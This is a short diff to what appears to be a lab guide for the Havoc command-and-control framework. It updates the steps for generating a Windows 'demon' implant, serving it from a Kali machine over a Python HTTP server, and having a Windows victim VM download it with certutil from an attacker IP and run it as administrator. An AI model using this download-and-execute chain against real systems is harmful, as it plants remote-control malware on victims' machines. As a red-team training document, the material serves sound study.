@@ -66,15 +66,15 @@ Default credentials (from `profiles/havoc.yaotl`):
 2. **Attack → Payload → Generate**
    - Format: Windows EXE
    - Listener: select the one you just created
-   - Save as `demon.exe`
+   - Save the file (Havoc saves it as `demon.x64.exe`)
 
 3. Host and deliver to Windows victim:
 ```bash
 # Kali — host the payload
-python3 -m http.server 8080 --directory ~/Desktop/
+python3 -m http.server 8080 --directory ~/Documents/
 
 # Windows VM — cmd as Admin
-certutil -urlcache -split -f http://<KALI_IP>:8080/demon.exe C:\Windows\Temp\demon.exe
+certutil -urlcache -split -f http://<KALI_IP>:8080/demon.x64.exe C:\Windows\Temp\demon.exe
 C:\Windows\Temp\demon.exe
 ```
 
